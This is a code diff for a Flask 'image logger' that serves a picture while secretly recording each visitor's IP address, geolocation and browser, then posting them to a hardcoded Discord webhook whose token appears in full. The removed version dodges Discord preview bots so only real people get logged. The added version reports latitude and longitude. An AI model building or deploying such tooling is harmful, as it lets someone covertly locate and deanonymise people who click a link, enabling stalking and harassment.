@@ -1,55 +1,34 @@
-from flask import Flask, request, Response
+from flask import Flask, request, send_file
 import requests
-import datetime
+import geoip2.database
+import os
 
 app = Flask(__name__)
 
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1363983953614340197/Zp_wS18KN2_mJMy4p0ecqXkRYI4C5hBEWF4ySz47RcY4rkF7Nye6pufbzHv0b1BI9Igp"
-IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMLjbnRX_uOEdZ60l5z19uEwyazYghr46wEA&s"
+@app.route('/')
+def index():
+    image_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMLjbnRX_uOEdZ60l5z19uEwyazYghr46wEA&s"
+    return send_file(requests.get(image_url, stream=True).raw, mimetype='image/jpeg')
 
-def get_location(ip):
-    try:
-        res = requests.get(f"https://ipapi.co/{ip}/json/")
-        data = res.json()
-        return f"{data.get('city', 'Unknown')}, {data.get('region', '')}, {data.get('country_name', '')}"
-    except:
-        return "Unknown Location"
-
-@app.route("/")
-def log_and_serve():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ua = request.headers.get("User-Agent", "Unknown")
-    time_now = datetime.datetime.utcnow().isoformat()
-
-    
-    bot_keywords = ["discord", "bot", "crawl", "spider", "preview", "monitor"]
-    if any(bot in ua.lower() for bot in bot_keywords):
-        img_response = requests.get(IMAGE_URL)
-        return Response(img_response.content, content_type=img_response.headers['Content-Type'])
-
-    
-    location = get_location(ip)
-
-    embed = {
-        "content": "📸 **Image Logged**",
-        "embeds": [
-            {
-                "title": "Horizon: crazy image logger in progress!!!",
-                "color": 0x3498DB,
-                "fields": [
-                    {"name": "IP Address", "value": ip, "inline": False},
-                    {"name": "Location", "value": location, "inline": False},
-                    {"name": "User-Agent", "value": ua, "inline": False},
-                    {"name": "Time (UTC)", "value": time_now, "inline": False}
-                ]
-            }
-        ]
+@app.route('/log', methods=['GET'])
+def log_ip():
+    ip = request.remote_addr
+    geo_db = geoip2.database.Reader('GeoLite2-City.mmdb')
+    response = geo_db.city(ip)
+    geo_info = {
+        "ip": ip,
+        "country": response.country.name,
+        "city": response.city.name,
+        "latitude": response.location.latitude,
+        "longitude": response.location.longitude
     }
+    webhook_url = "https://discordapp.com/api/webhooks/1363983953614340197/Zp_wS18KN2_mJMy4p0ecqXkRYI4C5hBEWF4ySz47RcY4rkF7Nye6pufbzHv0b1BI9Igp"
+    payload = {
+        "content": f"New visitor from IP: {geo_info['ip']}, {geo_info['city']}, {geo_info['country']} at coordinates {geo_info['latitude']}, {geo_info['longitude']}"
+    }
+    requests.post(webhook_url, json=payload)
+    return "Logged!"
 
-    try:
-        requests.post(WEBHOOK_URL, json=embed)
-    except Exception as e:
-        print(f"[ERROR] Webhook failed: {e}")
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
 
-    img_response = requests.get(IMAGE_URL)
-    return Response(img_response.content, content_type=img_response.headers['Content-Type'])
